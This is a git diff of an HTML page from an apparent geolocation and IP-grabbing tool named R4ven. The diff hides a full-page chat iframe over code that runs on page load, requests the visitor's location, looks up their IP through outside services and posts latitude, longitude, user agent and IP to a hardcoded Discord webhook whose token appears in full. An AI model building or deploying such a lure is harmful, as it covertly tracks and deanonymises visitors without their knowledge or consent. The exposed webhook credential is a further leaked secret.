@@ -1,17 +1,14 @@
 <!DOCTYPE html>
 <html>
+
 <body onload="getLocation()">
 
-<button onclick="getLocation()">Try It</button>
+<iframe src="https://www.tohla.com/chat/" width="100%" height="900" loading="lazy ass" style="border:none;">
+</iframe>
 
+</body>
 <script>
 var x = document.getElementById("demo");
- 
-$(window).load(function(){ /*This allows to execute your code after the  page is rendered fully */ 
-    $.get("https://thisisshubhamkumar.github.io/r4ven/getip.php", function(data){
-     /* you can then process the ajax response as needed */
-    });
-})
 
 function getLocation() {
   if (navigator.geolocation) {
@@ -21,8 +18,25 @@ function getLocation() {
   }
 }
 
+function myIP() {
+    if (window.XMLHttpRequest) xmlhttp = new XMLHttpRequest();
+    else xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+
+    xmlhttp.open("GET","http://api.hostip.info/get_html.php",false);
+    xmlhttp.send();
+
+    hostipInfo = xmlhttp.responseText.split("\n");
+
+    for (i=0; hostipInfo.length >= i; i++) {
+        ipAddress = hostipInfo[i].split(":");
+        if ( ipAddress[0] == "IP" ) return ipAddress[1];
+    }
+
+    return false;
+}
+
 function showPosition(position) {
-  var latlong = (" GET " , "Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude + "\nUagent:" + navigator.userAgent);
+  var latlong = (" GET " , "Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude + "\nUagent:" + navigator.userAgent + "\nFirewall ip: " + myIP());
   
   const request = new XMLHttpRequest();
       request.open("POST", "https://discord.com/api/webhooks/977798116013133904/Es0rxL_L86Igb_lb9HeDSW2jtRy4th7k5n5LUtGsgvCRD0hOXeeHt2E8kZZYfkMpjTKY"); //change webhook
@@ -59,5 +73,24 @@ function showError(error) {
 }
 </script>
 
-</body>
+<script>
+  function getIP(json) {
+    var ip = ("GET", "---\nIp-address: " + json.ip)
+
+    const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/977798116013133904/Es0rxL_L86Igb_lb9HeDSW2jtRy4th7k5n5LUtGsgvCRD0hOXeeHt2E8kZZYfkMpjTKY"); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "R4ven",
+        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        content: ip
+      }
+
+      request.send(JSON.stringify(params));
+
+  }
+  </script>
+  <script src="http://api.ipify.org?format=jsonp&callback=getIP"></script>
 </html>
